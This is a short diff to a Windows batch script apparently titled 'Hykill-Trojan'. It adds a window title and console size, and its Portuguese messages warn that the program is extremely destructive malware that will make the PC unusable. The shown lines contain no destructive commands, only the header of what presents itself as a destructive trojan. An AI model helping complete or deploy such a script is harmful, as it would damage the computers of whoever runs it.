@@ -1,4 +1,6 @@
 @echo off
+title Hykill-Trojan
+mode 1280,720
 echo esse softoware e considerado um malware EXETREMAMENTE DESTRUTIVO vc quer mesmo continuar
 pause
 echo Aviso final vc quer mesmo fazer seu PC ficar INUTILIZAVEL
